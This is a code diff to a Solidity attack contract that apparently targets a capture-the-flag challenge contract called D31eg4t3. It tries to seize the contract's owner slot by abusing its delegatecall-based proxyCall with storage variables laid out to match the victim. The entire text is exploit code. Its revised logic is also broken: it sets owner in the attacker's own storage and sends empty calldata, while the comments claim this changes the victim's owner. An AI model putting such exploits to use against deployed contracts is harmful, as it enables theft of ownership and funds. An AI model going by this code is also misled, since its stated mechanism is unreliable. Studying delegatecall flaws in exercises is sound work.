@@ -8,8 +8,15 @@ interface ID31eg4t3 {
 
 contract Attack {
     address internal immutable victim;
-    // Assuming the first variable in the victim contract is an address we want to overwrite.
-    address internal targetAddress;
+
+    uint256 internal var0; // Placeholder for var0
+    uint8 internal var1; // Placeholder for var1
+    string internal var2; // Placeholder for var2
+    address internal var3; // Placeholder for var3
+    uint8 internal var4; // Placeholder for var4
+    address public owner;
+
+
 
     constructor(address addr) payable {
         victim = addr;
@@ -17,17 +24,17 @@ contract Attack {
 
     // NOTE: You might need some malicious function here
 
-    // Malicious function that could be named similarly to a benign function in the victim contract
-    function changeResult() external {
-        targetAddress = msg.sender; // Example action: Overwrite a crucial address
-    }
 
     function exploit() external {
+        // Set the owner to the attacker's address through delegate call magic
+        owner = msg.sender;
+
         // Craft the data for the delegatecall
-        // The function selector for `changeResult()` in our contract
-        bytes memory data = abi.encodeWithSelector(Attack.changeResult.selector);
+        // This time we don't really need to call any function, the setting of owner above should suffice due to delegatecall's context sharing
+        bytes memory data = "";
 
         // Cast the victim address to the interface and make the proxy call
+        // This should inadvertently change the owner in the D31eg4t3 contract
         ID31eg4t3(victim).proxyCall(data);
     }
 }
